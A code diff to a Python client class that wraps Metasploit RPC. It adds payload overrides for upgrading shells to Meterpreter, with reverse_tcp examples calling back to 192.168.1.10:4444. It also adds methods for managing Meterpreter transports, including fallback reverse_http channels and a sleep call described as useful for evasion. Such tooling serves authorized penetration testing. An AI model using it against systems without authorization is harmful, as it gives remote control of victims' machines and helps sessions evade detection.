@@ -1976,7 +1976,12 @@ class MsfClient:
         return result["bytes_written"]
 
     async def session_shell_to_meterpreter(
-        self, session_id: int, lhost: str, lport: int, timeout: float = 120.0
+        self,
+        session_id: int,
+        lhost: str,
+        lport: int,
+        extra_options: dict[str, str] | None = None,
+        timeout: float = 120.0,
     ) -> bool:
         """Upgrade shell session to Meterpreter.
 
@@ -1993,18 +1998,47 @@ class MsfClient:
             session_id: Session ID
             lhost: Local host IP for reverse connection (must be an IP, not hostname)
             lport: Local port for reverse connection
+            extra_options: Optional dict of additional MSF options (see below)
             timeout: Timeout in seconds (default 120s due to payload generation/transfer)
 
         Returns:
             True if upgrade was initiated successfully
 
+        Advanced Options (via extra_options):
+            PAYLOAD_OVERRIDE: Override auto-detected payload
+                (e.g., "linux/x64/meterpreter/reverse_tcp")
+            PLATFORM_OVERRIDE: Override detected platform
+                (e.g., "linux", "windows", "osx")
+            PSH_ARCH_OVERRIDE: PowerShell architecture for Windows ("x64" or "x86")
+            WIN_TRANSFER: Transfer method for Windows ("POWERSHELL" or "VBS")
+            HANDLE_TIMEOUT: Timeout in seconds waiting for session (default 30)
+
+        Note:
+            MSF's shell_to_meterpreter has a bug where it always uses x86 payload
+            on Linux (regex /86/ matches both x86 and x86_64). To get x64 Meterpreter:
+                extra_options={"PAYLOAD_OVERRIDE": "linux/x64/meterpreter/reverse_tcp",
+                              "PLATFORM_OVERRIDE": "linux"}
+
         Example:
+            # Basic upgrade (uses auto-detected payload)
             success = await client.session_shell_to_meterpreter(1, "192.168.1.10", 4444)
-            if success:
-                print("Shell upgrade initiated")
+
+            # Force x64 Meterpreter on Linux
+            success = await client.session_shell_to_meterpreter(
+                1, "192.168.1.10", 4444,
+                extra_options={
+                    "PAYLOAD_OVERRIDE": "linux/x64/meterpreter/reverse_tcp",
+                    "PLATFORM_OVERRIDE": "linux"
+                }
+            )
         """
         result = await self._call(
-            "session_shell_to_meterpreter", session_id, lhost, lport, timeout=timeout
+            "session_shell_to_meterpreter",
+            session_id,
+            lhost,
+            lport,
+            extra_options or {},
+            timeout=timeout,
         )
         return result["success"]
 
@@ -2196,4 +2230,243 @@ class MsfClient:
             writable_dir,
             timeout,
         )
+        return result["success"]
+
+    # =========================================================================
+    # Session: Meterpreter Transport Management
+    # =========================================================================
+
+    async def session_transport_list(self, session_id: int) -> dict:
+        """List all transports configured for this Meterpreter session.
+
+        Returns transport configuration including:
+        - session_exp: Session expiration timeout
+        - transports: List of transport configurations
+
+        Each transport has: url, comm_timeout, retry_total, retry_wait, ua, etc.
+
+        Args:
+            session_id: Session ID
+
+        Returns:
+            Dict with session_exp and transports array
+
+        Example:
+            info = await client.session_transport_list(1)
+            print(f"Session expires in: {info['session_exp']}s")
+            for t in info['transports']:
+                print(f"Transport: {t['url']}")
+        """
+        result = await self._call("session_transport_list", session_id)
+        return result["transport_info"]
+
+    async def session_set_transport_timeouts(
+        self,
+        session_id: int,
+        session_exp: int | None = None,
+        comm_timeout: int | None = None,
+        retry_total: int | None = None,
+        retry_wait: int | None = None,
+    ) -> dict:
+        """Set transport timeouts for the currently active transport.
+
+        Args:
+            session_id: Session ID
+            session_exp: Session expiration timeout in seconds
+            comm_timeout: Communication timeout in seconds
+            retry_total: Total number of retries
+            retry_wait: Wait time between retries in seconds
+
+        Returns:
+            Dict with the updated timeout values
+
+        Example:
+            # Set 5 minute session expiration and 30 second comm timeout
+            timeouts = await client.session_set_transport_timeouts(
+                1, session_exp=300, comm_timeout=30
+            )
+        """
+        result = await self._call(
+            "session_set_transport_timeouts",
+            session_id,
+            session_exp,
+            comm_timeout,
+            retry_total,
+            retry_wait,
+        )
+        return result["timeouts"]
+
+    async def session_transport_add(
+        self,
+        session_id: int,
+        transport: str,
+        lport: int,
+        lhost: str | None = None,
+        ua: str | None = None,
+        comm_timeout: int | None = None,
+        session_exp: int | None = None,
+        retry_total: int | None = None,
+        retry_wait: int | None = None,
+    ) -> bool:
+        """Add a new transport to the Meterpreter session.
+
+        This adds a fallback transport that can be used if the current
+        transport fails. Useful for resilient multi-transport sessions.
+
+        Args:
+            session_id: Session ID
+            transport: Transport type (reverse_tcp, reverse_http, reverse_https, bind_tcp)
+            lport: Listening port
+            lhost: Listening host (required for reverse transports)
+            ua: User agent string (for HTTP/HTTPS transports)
+            comm_timeout: Communication timeout in seconds
+            session_exp: Session expiration timeout in seconds
+            retry_total: Total number of retries
+            retry_wait: Wait time between retries in seconds
+
+        Returns:
+            True if transport was added successfully
+
+        Example:
+            # Add a backup reverse_http transport
+            await client.session_transport_add(
+                1, "reverse_http", 8080, lhost="10.0.0.1"
+            )
+        """
+        result = await self._call(
+            "session_transport_add",
+            session_id,
+            transport,
+            lhost,
+            lport,
+            ua,
+            comm_timeout,
+            session_exp,
+            retry_total,
+            retry_wait,
+        )
+        return result["success"]
+
+    async def session_transport_remove(
+        self,
+        session_id: int,
+        transport: str,
+        lport: int,
+        lhost: str | None = None,
+    ) -> bool:
+        """Remove a transport from the Meterpreter session.
+
+        Args:
+            session_id: Session ID
+            transport: Transport type to remove
+            lport: Port of the transport to remove
+            lhost: Host of the transport to remove
+
+        Returns:
+            True if transport was removed successfully
+
+        Example:
+            await client.session_transport_remove(1, "reverse_http", 8080)
+        """
+        result = await self._call(
+            "session_transport_remove",
+            session_id,
+            transport,
+            lhost,
+            lport,
+        )
+        return result["success"]
+
+    async def session_transport_change(
+        self,
+        session_id: int,
+        transport: str,
+        lport: int,
+        lhost: str | None = None,
+    ) -> bool:
+        """Change the active transport to a different one.
+
+        This switches the Meterpreter to use a different transport.
+        The new transport must already be configured via transport_add.
+
+        WARNING: This may cause temporary loss of session connectivity
+        as the transport switches.
+
+        Args:
+            session_id: Session ID
+            transport: Transport type to switch to
+            lport: Port of the transport
+            lhost: Host of the transport
+
+        Returns:
+            True if transport change was initiated
+
+        Example:
+            # Switch to the backup HTTP transport
+            await client.session_transport_change(1, "reverse_http", 8080)
+        """
+        result = await self._call(
+            "session_transport_change",
+            session_id,
+            transport,
+            lhost,
+            lport,
+        )
+        return result["success"]
+
+    async def session_transport_sleep(self, session_id: int, seconds: int) -> bool:
+        """Put the Meterpreter session to sleep for the specified duration.
+
+        The session will go dormant and reconnect after the specified time.
+        This is useful for evasion - the session stops communicating temporarily.
+
+        WARNING: The session will be unresponsive during sleep.
+
+        Args:
+            session_id: Session ID
+            seconds: Number of seconds to sleep
+
+        Returns:
+            True if sleep was initiated
+
+        Example:
+            # Put session to sleep for 5 minutes
+            await client.session_transport_sleep(1, 300)
+        """
+        result = await self._call("session_transport_sleep", session_id, seconds)
+        return result["success"]
+
+    async def session_transport_next(self, session_id: int) -> bool:
+        """Switch to the next transport in the transport list.
+
+        This cycles to the next configured transport, useful for
+        testing transport failover.
+
+        Args:
+            session_id: Session ID
+
+        Returns:
+            True if switch was initiated
+
+        Example:
+            await client.session_transport_next(1)
+        """
+        result = await self._call("session_transport_next", session_id)
+        return result["success"]
+
+    async def session_transport_prev(self, session_id: int) -> bool:
+        """Switch to the previous transport in the transport list.
+
+        This cycles to the previous configured transport.
+
+        Args:
+            session_id: Session ID
+
+        Returns:
+            True if switch was initiated
+
+        Example:
+            await client.session_transport_prev(1)
+        """
+        result = await self._call("session_transport_prev", session_id)
         return result["success"]
